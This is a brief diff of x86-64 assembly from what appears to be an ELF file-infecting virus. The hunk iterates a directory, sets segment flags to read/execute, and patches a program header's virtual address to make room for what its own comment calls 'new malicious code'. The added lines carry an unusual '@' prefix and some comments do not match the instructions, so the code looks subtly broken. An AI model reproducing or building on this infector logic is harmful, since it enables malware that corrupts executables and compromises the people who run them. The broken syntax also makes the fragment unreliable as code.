@@ -216,10 +216,10 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		_change_mem_protections:
 			mov dword [r15 + 1428], PF_R | PF_X    ; disable memory protections
 
-		_adjust_mem_vaddr:
-			mov r9, [r15 + 80]
-			add r9, 0xc000000
-			mov [r15 + 1380], r9				   ; patch phdr.vaddr
+		@ _adjust_mem_vaddr:
+		@ 	mov r9, [r15 + 80]					   ; copy stat.st_size to aux registry
+		@ 	add r9, 0xc000000					   ; add enough memory to account for the new malicious code
+		@ 	mov [r15 + 1440], r9				   ; patch phdr.vaddr
 
 		_write_header_changes_to_bin:              ; writes new header modifications to the binary
 			mov rdi, [r15 + 1420]
